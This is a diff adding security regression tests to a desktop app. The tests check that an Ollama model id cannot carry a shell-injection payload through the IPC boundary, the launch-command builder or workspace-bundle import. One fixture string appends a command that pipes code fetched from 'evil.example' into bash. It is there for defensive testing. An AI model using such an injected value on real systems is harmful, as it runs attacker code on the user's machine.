@@ -9,6 +9,8 @@ import { isSafeExternalUrl, isTrustedRendererUrl } from '../src/main/security';
 import { assertAllowedDashboardUrl, extractDashboardUrl } from '../src/main/dashboard/dashboardUrl';
 import { SESSION_COOKIE_TTL_SECONDS, toPersistentCookie } from '../src/main/dashboard/cookiePersistence';
 import { INVOKE_CHANNELS, type InvokeChannel } from '../src/shared/ipc';
+import { resolveLaunchCommand } from '../src/shared/runtimes';
+import { parseWorkspaceBundle } from '../src/shared/workspaceBundle';
 import type { SessionMeta } from '../src/shared/types';
 
 let passed = 0;
@@ -348,6 +350,67 @@ const mainEntry = readFileSync(join(process.cwd(), 'src/main/index.ts'), 'utf8')
 check('renderer sandbox is enabled', mainEntry.includes('sandbox: true') && !mainEntry.includes('sandbox: false'));
 check('photo scheme no longer bypasses CSP',
   !readFileSync(join(process.cwd(), 'src/main/photos.ts'), 'utf8').includes('bypassCSP'));
+
+// An Ollama model id is substituted into `ollama run ${model}`, and PtyManager
+// types that line into a login shell. Before this was closed, the value was
+// accepted as free text at every boundary — including from an imported
+// workspace bundle, which deliberately refuses to carry customCommand.
+const INJECTING_MODEL = 'llama3; curl -s http://evil.example/p | bash';
+const agentUpdate = (ollamaModel: string): unknown => ({
+  id: 'agent-1', name: 'Runner', runtime: 'ollama', permissionMode: 'default', ollamaModel,
+});
+
+// The negative and positive case share one fixture, so a payload that is
+// rejected for an unrelated reason (a missing required field) cannot be
+// mistaken for the model id being refused.
+check('an injecting ollamaModel is refused at the IPC boundary',
+  rejects('agent:update', agentUpdate(INJECTING_MODEL)));
+
+check('a plain Ollama model id still passes the IPC boundary',
+  !rejects('agent:update', agentUpdate('llama3:8b'))
+  && !rejects('agent:update', agentUpdate('hf.co/org/repo:Q4_K_M')));
+
+check('resolveLaunchCommand fails closed instead of interpolating a shell payload', (() => {
+  try {
+    resolveLaunchCommand({
+      runtime: 'ollama', permissionMode: 'default', ollamaModel: INJECTING_MODEL,
+    });
+    return false;
+  } catch (error) {
+    return error instanceof Error && error.message.includes('unsafe Ollama model id');
+  }
+})());
+
+check('resolveLaunchCommand still builds the ordinary Ollama command',
+  resolveLaunchCommand({
+    runtime: 'ollama', permissionMode: 'default', ollamaModel: 'llama3:8b',
+  }).includes('llama3:8b'));
+
+const bundleWith = (ollamaModel: string): unknown => ({
+  format: 'ade-workspace-bundle', version: 1, exportedAt: '2026-08-01T00:00:00.000Z',
+  sourcePlatform: 'linux', repositories: [], assets: [], notices: [], agentTemplates: [],
+  categories: [{ id: 'cat', name: 'Cat', agentIds: ['ag'] }],
+  agents: [{
+    id: 'ag', categoryId: 'cat', name: 'Agent', runtime: 'ollama', permissionMode: 'default',
+    ollamaModel, sourceHomeBackend: 'native', sourceHomePathStyle: 'posix',
+  }],
+  settings: {
+    theme: 'dark',
+    memory: { enabled: true, userProfileEnabled: true, memoryCharLimit: 1, userCharLimit: 1 },
+  },
+});
+
+check('a workspace bundle carrying an injecting model id fails to parse', (() => {
+  try {
+    parseWorkspaceBundle(bundleWith(INJECTING_MODEL));
+    return false;
+  } catch (error) {
+    return error instanceof Error && error.message.includes('ollamaModel');
+  }
+})());
+
+check('the same bundle parses once the model id is a plain one',
+  parseWorkspaceBundle(bundleWith('llama3:8b')).agents[0]?.ollamaModel === 'llama3:8b');
 
 function session(overrides: Partial<SessionMeta>): SessionMeta {
   return {
